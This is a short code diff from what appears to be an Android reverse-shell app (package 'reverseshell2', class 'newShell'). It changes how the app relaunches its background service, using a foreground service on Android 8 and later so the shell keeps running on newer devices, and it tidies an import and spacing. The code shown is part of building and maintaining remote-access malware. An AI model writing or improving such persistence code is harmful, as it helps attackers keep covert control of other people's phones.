@@ -8,6 +8,8 @@ import android.util.AndroidRuntimeException;
 import android.util.Base64;
 import android.util.Log;
 
+import androidx.core.content.ContextCompat;
+
 import com.example.reverseshell2.functions;
 import com.example.reverseshell2.mainService;
 
@@ -107,7 +109,7 @@ public class newShell {
                 break;
             } catch (Exception e) {
             }
-        }catch (Exception e){
+        } catch (Exception e){
                 Log.d("service_runner","called");
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                     functions.jobScheduler(context);
@@ -115,7 +117,12 @@ public class newShell {
                     activity.runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
-                            context.startService(new Intent(context, mainService.class));
+                            Intent serviceIntent = new Intent(context, mainService.class);
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                ContextCompat.startForegroundService(context, serviceIntent);
+                            } else {
+                                context.startService(serviceIntent);
+                            }
                         }
                     });
                 }
